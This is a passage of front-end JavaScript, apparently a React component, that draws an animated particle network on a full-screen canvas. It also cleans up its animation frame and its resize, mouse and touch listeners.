                                const lineAlpha = (1 - dist / maxDist) * 0.22 * Math.min(p1.alpha, p2.alpha);
                                ctx.beginPath();
                                ctx.moveTo(p1.x, p1.y);
                                ctx.lineTo(p2.x, p2.y);
                                ctx.strokeStyle = `rgba(${p1.color}, ${lineAlpha})`;
                                ctx.lineWidth = Math.max(0.3, 1.1 * p1.scale);
                                ctx.stroke();
                            }
                        }
                    }

                    animId = requestAnimationFrame(loop);
                };

                loop();

                return () => {
                    window.removeEventListener("resize", onResize);
                    window.removeEventListener("mousemove", onMouseMove);
                    window.removeEventListener("touchmove", onTouchMove);
                    cancelAnimationFrame(animId);
                };
            }, []);

            return r.jsx("canvas", {
                ref: ref,
                className: "fixed inset-0 pointer-events-none z-0",
                style: {
                    width: "100%",
                    height: "100%"
                }
            });
        }

        